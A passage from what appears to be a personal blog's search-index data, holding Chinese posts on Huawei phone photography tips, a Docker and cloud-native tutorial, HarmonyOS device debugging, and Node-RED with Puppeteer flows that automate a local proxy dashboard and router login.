House也能拍出电影感！皮肤质感直接提升50%！ 【干货2：微距彩蛋】 长焦镜头不仅能拍远景，切换「超级微距」模式，2.5cm怼脸拍睫毛根根分明，美妆博主都直呼内行！\n光斑选「旋焦」！逆光秒变星芒氛围 👉 人像模式→点顶部「光斑」→选「旋焦」拍侧脸： ✓ 背景玻璃反光变旋转星环，发丝自带金边，原图直出不用修！ ✓ 普通虚化像贴纸，旋焦让背景有「呼吸感」，随手拍都是电影截图\n电影模式藏得深！鎏金滤镜封神 👉 左滑到「更多」→开「电影模式」选「鎏金」： 暖黄颗粒感直接拉满！拍复古小店/蛋糕摆拍，秒变90年代老电影质感，发朋友圈被问“在哪拍的微电影”～\n动态追焦拍视频！端盘子不糊片 👉 长按对焦框锁定物体： 拍vlog端蛋糕走动，镜头全程锁食物，奶油晃动细节超清晰！拍店员拉花，奶泡上的字放大都不模糊～\n懒人公式：逆光+旋焦光斑+鎏金滤镜，随手拍都是封面！ 华为Nova14Pro 拍照神器\n**打工人必薅！Nova14 Pro 5个效率神技 （封面：手机分屏显示文档+微信，桌面浮着「智慧识屏」按钮）\n长按屏幕2秒→合同转Word！ 👉 智慧识屏提取图片文字，表格/手写都能认，地铁10分钟搞定文件编辑，老板夸“反应快”～\n三指上滑分屏！开会摸鱼两不误 👉 左腾讯文档开会，右微信回消息，侧边栏拖淘宝变悬浮窗比价，摸鱼工作无缝切换（嘘～）\n备忘录扫描→纸质笔记变电子档！ 拍3页手写会议纪要，自动识别文字+排版，准确率99%，导出PDF直接发群，省掉半小时狂记时间！\n花 48mm F/2.2 1/100s \u0026amp; 200s ISO200 人 72mm F2.4 1/50s ISO320 ISO600\n相册 编辑 AI移图\n雨 M 测光点 ISO 400 S 1/100 F AF-C AWB 白平衡调至4200K 拍雨滴：快门S：1/1000 ISO：1600 拍雨丝：快门S：1/100 ISO：100 拍雨条：快门S：1/10 ISO：50","title":"HW PIC"},{"content":"云原生技术实践 一、云计算技术发展历程 时间 关键技术 说明 2001 VMware虚拟化 商业虚拟化技术兴起 2010 开源IaaS/PaaS OpenStack等开源平台出现 2013 容器技术 Docker等技术开始流行 2015 云原生（Cloud Native） CNCF成立，云原生概念正式确立 现状：70%用户已采用微服务架构\n云原生技术体系 核心技术要素 容器：轻量级应用封装 服务网格：微服务治理 微服务：功能解耦 不可变基础设施：通过镜像保证一致性 声明式API：简化资源配置管理 技术优势 灵活性：跨环境一致性部署 可维护性：简化系统运维 敏捷性：快速迭代能力 开源生态：以Kubernetes为中心的开放标准 三、容器技术详解 1. 容器 vs 虚拟机 特性 容器 虚拟机 资源隔离 共享OS内核 独立OS 启动速度 秒级 分钟级 密度 单机支持1000+容器 通常10-20台VM/物理机 典型场景 微服务/DevOps 传统多租户隔离 2. Docker技术栈 架构组成 Docker Client → Docker Daemon → Container Runtime\n核心组件 Docker Engine：C/S架构客户端-服务端 Docker CLI：命令行交互工具 Docker Daemon：后台服务进程 Containerd：OCI兼容运行时 3. 镜像构建示例 示例Dockerfile # 基于httpd镜像构建Web服务器 FROM httpd:2.4 # 维护者信息 LABEL maintainer=\u0026#34;docker_user \u0026lt;docker_user@email.com\u0026gt;\u0026#34; # 复制自定义网页内容 COPY index.html /usr/local/apache2/htdocs/ # 添加启动脚本并设置权限 ADD run.sh /run.sh RUN chmod +x /run.sh # 暴露80端口 EXPOSE 80 # 容器启动命令 CMD [\u0026#34;/run.sh\u0026#34;] # 构建镜像（在Dockerfile所在目录执行） docker build -t my-apache:1.0 . # 运行容器 docker run -d -p 8080:80 --name my-web my-apache:1.0 四、容器关键特性 4.1 镜像分层存储 容器镜像采用分层存储机制：\n​​写时复制(CoW)​​：节省存储空间 ​​层缓存机制​​：加速构建过程 ​​UnionFS​​：联合文件系统实现\n4.2 镜像操作指令 Dockerfile 指令详解 指令 作用 示例 FROM 基础镜像 FROM ubuntu:20.04 COPY 文件复制 COPY ./app /app RUN 执行命令 RUN apt-get update EXPOSE 声明端口 EXPOSE 8080 CMD/ENTRY 容器启动命令 CMD [\u0026quot;nginx\u0026quot;, \u0026quot;-g\u0026quot;] 五、云原生生态扩展 5.1 微服务架构 非侵入式通信：Sidecar模式（如Istio） 灰度发布：金丝雀发布/蓝绿部署 可观测性：集成Prometheus+Grafana监控 5.2 DevOps实践 CI/CD流水线：GitLab CI/Jenkins 基础设施即代码(IaC)：Terraform/Ansible 监控体系：Prometheus + Grafana 推荐工具链： 代码管理：GitHub/GitLab 构建：Jenkins/ArgoCD 部署：Helm/Kustomize 5.3 容器编排 Kubernetes核心功能：\n自动伸缩(Horizontal Pod Autoscaler) 服务发现(Service) 存储卷管理(PersistentVolume) 配置管理(ConfigMap/Secret) 六、容器仓库 6.1 公共仓库 仓库名称 特点 Docker Hub 官方托管平台，镜像丰富 Quay.io Red Hat支持的仓库，企业级支持 常用命令：\n# 从Docker Hub拉取镜像 docker pull nginx:latest 6.2 私有仓库 开源方案：\nDocker Registry：基础版 Harbor：企业级增强版（含审计、RBAC） 部署示例：\n# 快速启动本地仓库 docker run -d \\ -p 5000:5000 \\ --name registry \\ -v /opt/registry:/var/lib/registry \\ registry:2 # 标记并推送镜像到私有仓库 docker tag my-app:1.0 localhost:5000/my-app:1.0 docker push localhost:5000/my-app:1.0 安全建议：\n生产环境启用TLS加密 集成Notary实现镜像签名验证 配置访问控制（如OAuth2） 七、运行容器 执行docker run命令运行一个容器。 -d 参数可在后台运行容器 -p 参数将宿主机8080端口映射到容器80端口。\ndocker exec\ndocker exec [选项] \u0026lt;容器ID或名称\u0026gt; \u0026lt;命令\u0026gt; [参数...] 常用选项：\n-i：保持标准输入打开（交互式）。 -t：分配伪终端（通常与 -i 结合使用，即 -it）。 -d：后台运行命令。\n示例：\n# 交互式进入容器（打开 bash 终端） docker exec -it my-container bash # 查看容器内文件 docker exec my-container ls /app # 后台执行命令 docker exec -d my-container touch /tmp/debug.log 常用命令速查表 场景 命令示例 镜像管理 docker images, docker rmi 容器操作 docker ps, docker exec 网络配置 docker network ls, docker run --network 日志查看 docker logs -f \u0026lt;container_id\u0026gt; 运行与管理 httpd 容器 运行 httpd 容器 docker run -d -p 80:8080 registry.access.redhat.com/rhscl/httpd-24-rhel7 若未找到镜像，系统会自动下载并创建镜像（如 3c5547...）。 查看容器与镜像信息 查看运行中容器： docker container ls 查看镜像列表： docker image ls 访问 httpd 容器 Web 服务 终端访问（替换 EIP 为实际公网 IP）： curl EIP:80 浏览器访问：输入 http://EIP:80 即可访问。 停止容器 查看所有容器（含停止状态）： docker ps -a 停止容器（替换 容器ID）： docker stop 容器ID 启动容器 docker start 容器ID # 替换为实际容器ID 删除容器 docker stop 容器ID # 先停止容器 docker rm 容器ID # 再删除容器 验证删除：docker ps -a 确认容器已移除。 容器镜像实操 使用 docker commit 构建镜像 下载并导入镜像：\nwget https://sandbox-expriment-files.obs.cn-north-1.myhuaweicloud.com/20230307/HCE-2.0.2212-docker.x86_64.tar.xz docker import HCE-2.0.2212-docker.x86_64.tar.xz hce:latest docker run -itd hce:latest /bin/bash 进入容器并验证 vim：\ndocker exec -it 容器ID bash # 替换容器ID vim # 提示未安装 拷贝源文件至容器：\ndocker cp /etc/yum.repos.d/ 容器ID:/etc # 通过新终端登录 ECS 执行 安装 vim 并提交新镜像：\nyum install -y vim # 在容器内执行 exit # 退出容器 docker commit 容器ID hce-vim # 构建新镜像 验证新镜像：\ndocker run -d -t hce-vim # 运行新镜像 docker exec -it 容器ID bash # 进入容器 vim --help # 验证可用 使用 Dockerfile 构建镜像 创建并编辑 Dockerfile：\ntouch dockerfile vim dockerfile FROM hce-vim:latest MAINTAINER Iris@huawei.com ENV HOSTNAME webserver EXPOSE 80 RUN yum install -y httpd vi \u0026amp;\u0026amp; yum clean all VOLUME [\u0026#34;/var/www/html\u0026#34;] CMD [\u0026#34;/usr/sbin/httpd\u0026#34;, \u0026#34;-D\u0026#34;, \u0026#34;FOREGROUND\u0026#34;] 构建并运行镜像：\ndocker build -t httpd-hce -f dockerfile /root docker run -d -p 80:80 httpd-hce 浏览器访问 http://EIP:80 验证服务。 4.3 搭建私有镜像仓库（Registry） 运行私有仓库容器：\ndocker run -d -p 5000:5000 hub.c.163.com/library/registry:latest 标记并推送镜像：\ndocker tag httpd-hce localhost:5000/httpd:V1 docker push localhost:5000/httpd:V1 查看仓库镜像：\ncurl -X GET http://localhost:5000/v2/_catalog # 列出所有镜像 curl -X GET http://localhost:5000/v2/httpd/tags/list # 查看指定镜像标签 删除本地镜像并从仓库拉取：\ndocker rmi localhost:5000/httpd:V1 httpd-hce # 删除本地镜像 docker pull localhost:5000/httpd:V1 # 从仓库拉取 容器生命周期管理 容器状态操作 运行容器并保持状态：\ndocker run -d hce sh -c \u0026#34;while true ; do echo hello world ; sleep 10 ; done\u0026#34; 进入容器（attach 方式）：\ndocker attach 容器ID 暂停/恢复容器：\ndocker pause 容器ID # 暂停 docker unpause 容器ID # 恢复 文件拷贝（宿主机 ↔ 容器）：\ntouch 1.txt docker cp ~/1.txt 容器ID:/home # 拷贝至容器 删除容器（支持强制删除）：\ndocker stop 容器ID docker rm 容器ID # 或 docker rm -f 容器ID 强制删除 删除镜像（需先删除关联容器）：\ndocker rmi 镜像ID 容器监控与日志管理 原生监控 查看容器内进程：\ndocker top 容器ID 监控资源状态：\ndocker stats # 监控所有容器 docker stats 容器ID # 监控指定容器（加 --no-stream 仅输出当前状态） 日志管理 通过 systemd 查看日志：\njournalctl -b CONTAINER_NAME=容器名 # 替换容器名 通过 Docker 查看终端日志：\ndocker logs 容器ID 查看 Docker 服务日志：\njournalctl -u docker.service 总结 容器基础 镜像 生命周期 监控日志\n","permalink":"https://qfsyso.github.io/posts/docker-cloud-native/","summary":"云原生技术实践 一、云计算技术发展历程 时间 关键技术 说明 2001 VMware虚拟化 商业虚拟化技术兴起 2010 开源IaaS/PaaS OpenStack等开源平台出现 2013 容器技术 Docker等技术开始流行 2015 云原生（Cloud Native） CNCF成立，云原生概念正式确立 现状：70%用户已采用微服务架构\n云原生技术体系 核心技术要素 容器：轻量级应用封装 服务网格：微服务治理 微服务：功能解耦 不可变基础设施：通过镜像保证一致性 声明式API：简化资源配置管理 技术优势 灵活性：跨环境一致性部署 可维护性：简化系统运维 敏捷性：快速迭代能力 开源生态：以Kubernetes为中心的开放标准 三、容器技术详解 1. 容器 vs 虚拟机 特性 容器 虚拟机 资源隔离 共享OS内核 独立OS 启动速度 秒级 分钟级 密度 单机支持1000+容器 通常10-20台VM/物理机 典型场景 微服务/DevOps 传统多租户隔离 2. Docker技术栈 架构组成 Docker Client → Docker Daemon → Container Runtime\n核心组件 Docker Engine：C/S架构客户端-服务端 Docker CLI：命令行交互工具 Docker Daemon：后台服务进程 Containerd：OCI兼容运行时 3.","title":"Docker Cloud Native"},{"content":"HarmonyOS5.0真机调试 1.开发者选线打开 类似安卓点击版本 软件版本 5次开启 重启\n2.设置-系统-开发者-USB调试 连上 DevEco对即可调试\nuniapp HarmonyOS 真机调试 小三角 运行 运行到鸿蒙\n申请证书 尚未完成开发者注册 数字证书是由华为的 AppGallery Connect 服务系统（简称 AGC）颁发的，开发者首先需要在 AGC 中完成开发者注册，才能申请数字证书。\n未找到包名为 xx 的应用 登录 AGC 之后，进入【证书、APP ID 和 Profile】中的【APP ID】页面，为指定的包名创建应用，然后才能为该应用申请证书。 https://uniapp.dcloud.net.cn/tutorial/harmony/runbuild.html#signing-configs\nhttps://developer.huawei.com/consumer/cn/service/josp/agc/index.html#/\n等待插件下载 等待编译页面 .hap\n如果没问题，就可以运行到真机了 注意：证书，云关联\n注意 性能和包体积，均不及发行模式\n鸿蒙整体处于发展初期，能用，有坑，大部分坑有规避方案。 但开发者应建议其领导、客户、质量部门降低期望，不能严格比照Android和iOS的验收标准要求鸿蒙。\nSetup APK 安装apk 传文件得到.apk.1 改名apk 桌易通传文件 识别安装\n学堂 https://developer.huawei.com/consumer/cn/training/\n社区问答 https://developer.huawei.com/consumer/cn/forum/\nflutter 当前可以通过flutter create/biuld去生成对应的ohos工程，flutter的代码通过引擎编译后会生成可运行的鸿蒙工程。 参考链接：https://gitee.com/openharmony-sig/flutter_flutter/tree/dev/ 可以直接打包,并集成到项目中。 可以通过flutter build har指令打包成har包，将har作为模块，集成到项目中。 har包使用方法参考：https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V13/har-package-V13?catalogVersion=V13\nRN 4 HM https://gitee.com/openharmony-sig/ohos_react_native/blob/0.72.5-ohos-5.0-release/docs/zh-cn/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md\nHarmonyOS 支持机型 https://consumer.huawei.com/cn/support/harmonyos/models-next/\n","permalink":"https://qfsyso.github.io/posts/harmonyos-run/","summary":"HarmonyOS5.0真机调试 1.开发者选线打开 类似安卓点击版本 软件版本 5次开启 重启\n2.设置-系统-开发者-USB调试 连上 DevEco对即可调试\nuniapp HarmonyOS 真机调试 小三角 运行 运行到鸿蒙\n申请证书 尚未完成开发者注册 数字证书是由华为的 AppGallery Connect 服务系统（简称 AGC）颁发的，开发者首先需要在 AGC 中完成开发者注册，才能申请数字证书。\n未找到包名为 xx 的应用 登录 AGC 之后，进入【证书、APP ID 和 Profile】中的【APP ID】页面，为指定的包名创建应用，然后才能为该应用申请证书。 https://uniapp.dcloud.net.cn/tutorial/harmony/runbuild.html#signing-configs\nhttps://developer.huawei.com/consumer/cn/service/josp/agc/index.html#/\n等待插件下载 等待编译页面 .hap\n如果没问题，就可以运行到真机了 注意：证书，云关联\n注意 性能和包体积，均不及发行模式\n鸿蒙整体处于发展初期，能用，有坑，大部分坑有规避方案。 但开发者应建议其领导、客户、质量部门降低期望，不能严格比照Android和iOS的验收标准要求鸿蒙。\nSetup APK 安装apk 传文件得到.apk.1 改名apk 桌易通传文件 识别安装\n学堂 https://developer.huawei.com/consumer/cn/training/\n社区问答 https://developer.huawei.com/consumer/cn/forum/\nflutter 当前可以通过flutter create/biuld去生成对应的ohos工程，flutter的代码通过引擎编译后会生成可运行的鸿蒙工程。 参考链接：https://gitee.com/openharmony-sig/flutter_flutter/tree/dev/ 可以直接打包,并集成到项目中。 可以通过flutter build har指令打包成har包，将har作为模块，集成到项目中。 har包使用方法参考：https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V13/har-package-V13?catalogVersion=V13\nRN 4 HM https://gitee.com/openharmony-sig/ohos_react_native/blob/0.72.5-ohos-5.0-release/docs/zh-cn/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md\nHarmonyOS 支持机型 https://consumer.","title":"HarmonyOS Run"},{"content":"Setup Node-RED 一、前提条件：安装 Node.js Node-RED 需要 Node.js 环境，需先安装 Node.js。\n打开 Node.js 官网：https://nodejs.org/ 下载并安装 LTS（长期支持）版本 安装完成后打开终端（Win + X → 终端），输入以下命令检查是否安装成功： node -v npm -v 二、全局安装 Node-RED 在命令行中执行以下命令安装 Node-RED：\nnpm install -g --unsafe-perm node-red 说明：\n-g：表示全局安装 --unsafe-perm：解决某些系统中权限问题 三、启动 Node-RED 安装完成后，在终端中运行：\nnode-red 输出类似以下内容：\nServer now running at http://127.0.0.1:1880/ 四、访问 Node-RED 编辑器 打开浏览器访问：\nhttp://localhost:1880 即可进入图形化流程编辑界面。\n🛠️ 五、可选：创建桌面快捷方式（.bat 启动脚本） 创建一个文本文件，内容如下：\n@echo off title Node-RED node-red pause 保存为 node-red.bat\n双击即可启动 Node-RED\n六、（可选）将 Node-RED 作为后台服务运行 你可以使用如下工具实现后台服务：\npm2（推荐）：适用于 Node.js 程序管理 nssm（适用于 Windows）：https://nssm.cc/ 常见问题 如果 npm install 失败，请确认网络是否畅通，或使用淘宝镜像源：\nnpm config set registry https://registry.npmmirror.com Test YouTube 使用Node-RED实现YouTube可用性检测及自动跳转的解决方案\npuppeteer NR 设置 节点管理 搜索安装\n@wangg-mail/node-red-contrib-puppeteer\n定时检测js [{ \u0026#34;id\u0026#34;: \u0026#34;inject-check\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;inject\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;定时检测\u0026#34;, \u0026#34;props\u0026#34;: [{ \u0026#34;p\u0026#34;: \u0026#34;payload\u0026#34; }], \u0026#34;repeat\u0026#34;: \u0026#34;5m\u0026#34;, \u0026#34;crontab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;once\u0026#34;: false, \u0026#34;onceDelay\u0026#34;: 0.1, \u0026#34;topic\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;payload\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;payloadType\u0026#34;: \u0026#34;date\u0026#34;, \u0026#34;x\u0026#34;: 130, \u0026#34;y\u0026#34;: 480, \u0026#34;wires\u0026#34;: [ [\u0026#34;http-check\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;http-check\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;http request\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;检测YouTube\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;ret\u0026#34;: \u0026#34;txt\u0026#34;, \u0026#34;paytoqs\u0026#34;: \u0026#34;ignore\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.youtube.com\u0026#34;, \u0026#34;tls\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;persist\u0026#34;: false, \u0026#34;proxy\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;insecureHTTPParser\u0026#34;: false, \u0026#34;authType\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;senderr\u0026#34;: false, \u0026#34;headers\u0026#34;: [], \u0026#34;x\u0026#34;: 290, \u0026#34;y\u0026#34;: 480, \u0026#34;wires\u0026#34;: [ [\u0026#34;condition-check\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;condition-check\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;switch\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;状态判断\u0026#34;, \u0026#34;property\u0026#34;: \u0026#34;statusCode\u0026#34;, \u0026#34;propertyType\u0026#34;: \u0026#34;msg\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;t\u0026#34;: \u0026#34;eq\u0026#34;, \u0026#34;v\u0026#34;: \u0026#34;200\u0026#34;, \u0026#34;vt\u0026#34;: \u0026#34;str\u0026#34; }, { \u0026#34;t\u0026#34;: \u0026#34;neq\u0026#34;, \u0026#34;v\u0026#34;: \u0026#34;200\u0026#34;, \u0026#34;vt\u0026#34;: \u0026#34;str\u0026#34; }], \u0026#34;checkall\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;repair\u0026#34;: false, \u0026#34;outputs\u0026#34;: 2, \u0026#34;x\u0026#34;: 460, \u0026#34;y\u0026#34;: 480, \u0026#34;wires\u0026#34;: [ [\u0026#34;success-path\u0026#34;], [\u0026#34;fail-path\u0026#34;, \u0026#34;browser-launch\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;success-path\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;正常状态\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;payload\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;msg\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 660, \u0026#34;y\u0026#34;: 440, \u0026#34;wires\u0026#34;: [] }, { \u0026#34;id\u0026#34;: \u0026#34;fail-path\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;异常处理\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;payload\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;msg\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 660, \u0026#34;y\u0026#34;: 480, \u0026#34;wires\u0026#34;: [] }] 自动化js [{ \u0026#34;id\u0026#34;: \u0026#34;30e0c8d1a45fa1a4\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;inject\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;测试点击\u0026#34;, \u0026#34;props\u0026#34;: [{ \u0026#34;p\u0026#34;: \u0026#34;payload\u0026#34; }], \u0026#34;repeat\u0026#34;: \u0026#34;5m\u0026#34;, \u0026#34;crontab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;once\u0026#34;: false, \u0026#34;onceDelay\u0026#34;: 0.1, \u0026#34;topic\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;payload\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;payloadType\u0026#34;: \u0026#34;date\u0026#34;, \u0026#34;x\u0026#34;: 170, \u0026#34;y\u0026#34;: 860, \u0026#34;wires\u0026#34;: [ [\u0026#34;1eae1abeb1722de6\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;a7a242dcdab87360\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-goto\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;打开网页\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://192.168.XXX.2:XXX/ui/dashboard/#/proxies?host=192.168.XXX.2\u0026amp;port=8899\u0026amp;secret=123789*qwe.12XXX\u0026#34;, \u0026#34;urltype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;waitUntil\u0026#34;: \u0026#34;networkidle0\u0026#34;, \u0026#34;x\u0026#34;: 420, \u0026#34;y\u0026#34;: 920, \u0026#34;wires\u0026#34;: [ [\u0026#34;22745ccecdfaf782\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;22745ccecdfaf782\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-waitFor\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;等待元素加载\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;.proxies-speed-test\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;x\u0026#34;: 240, \u0026#34;y\u0026#34;: 980, \u0026#34;wires\u0026#34;: [ [\u0026#34;d95b885ca516dfc9\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;d95b885ca516dfc9\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-click\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;.proxies-speed-test\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;button\u0026#34;: \u0026#34;left\u0026#34;, \u0026#34;clickCount\u0026#34;: 1, \u0026#34;delay\u0026#34;: 0, \u0026#34;name\u0026#34;: \u0026#34;点击元素\u0026#34;, \u0026#34;x\u0026#34;: 480, \u0026#34;y\u0026#34;: 980, \u0026#34;wires\u0026#34;: [ [\u0026#34;d41eac91fe364b99\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;d41eac91fe364b99\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-browser-close\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;关闭浏览器\u0026#34;, \u0026#34;x\u0026#34;: 670, \u0026#34;y\u0026#34;: 980, \u0026#34;wires\u0026#34;: [ [\u0026#34;355a73588e3d6763\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;355a73588e3d6763\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;debug\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;调试输出\u0026#34;, \u0026#34;active\u0026#34;: true, \u0026#34;tosidebar\u0026#34;: true, \u0026#34;console\u0026#34;: false, \u0026#34;tostatus\u0026#34;: false, \u0026#34;complete\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;targetType\u0026#34;: \u0026#34;full\u0026#34;, \u0026#34;statusVal\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;statusType\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;x\u0026#34;: 860, \u0026#34;y\u0026#34;: 980, \u0026#34;wires\u0026#34;: [] }, { \u0026#34;id\u0026#34;: \u0026#34;1eae1abeb1722de6\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-browser-launch\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;slowMo\u0026#34;: 0, \u0026#34;headless\u0026#34;: false, \u0026#34;debugport\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;devtools\u0026#34;: false, \u0026#34;cookies\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;启动浏览器\u0026#34;, \u0026#34;executablePath\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;arguments\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;x\u0026#34;: 230, \u0026#34;y\u0026#34;: 920, \u0026#34;wires\u0026#34;: [ [\u0026#34;a7a242dcdab87360\u0026#34;] ] }] puppeteer-browser-launch\nheadless 设为 true（无界面运行），如果想看真机效果可设为 false。\nexecutablePath 一般留空，默认使用内置 Chromium。如果你有本地 Chrome 路径，也可以填入。\npuppeteer-page-goto\nurl 填 对应\nwaitUntil 设为 networkidle2，保证页面资源加载完毕。\npuppeteer-page-click\nselector 填目标 CSS 选择器：.proxies-speed-test\ndelay 是点击前的延迟（ms），可根据需要调整。\npuppeteer-browser-close\n完成后关闭浏览器实例，防止内存泄漏。\n部署运行 添加节点后 部署运行\n2025/5/25 12:00:54节点: 调试输出 msg : Object { _msgid: \u0026ldquo;7c15c68296789ab6\u0026rdquo;, payload: 1748059248073 }\n模拟登录更新配置 [ { \u0026#34;id\u0026#34;: \u0026#34;goto_login\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-goto\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;打开登陆\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://192.168.80.2/cgi-bin/luci/\u0026#34;, \u0026#34;urltype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;waitUntil\u0026#34;: \u0026#34;networkidle0\u0026#34;, \u0026#34;x\u0026#34;: 830, \u0026#34;y\u0026#34;: 900, \u0026#34;wires\u0026#34;: [ [ \u0026#34;type_password\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;type_password\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-keyboard-type\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Type Password\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;texttype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;x\u0026#34;: 1070, \u0026#34;y\u0026#34;: 900, \u0026#34;wires\u0026#34;: [ [ \u0026#34;7c85207c0e8517b3\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;delay_1\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wait sec\u0026#34;, \u0026#34;pauseType\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;timeoutUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;rate\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nbRateUnits\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomFirst\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomLast\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;allowrate\u0026#34;: false, \u0026#34;outputs\u0026#34;: 1, \u0026#34;x\u0026#34;: 1460, \u0026#34;y\u0026#34;: 900, \u0026#34;wires\u0026#34;: [ [ \u0026#34;goto_openclash\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;goto_openclash\u0026#34;, 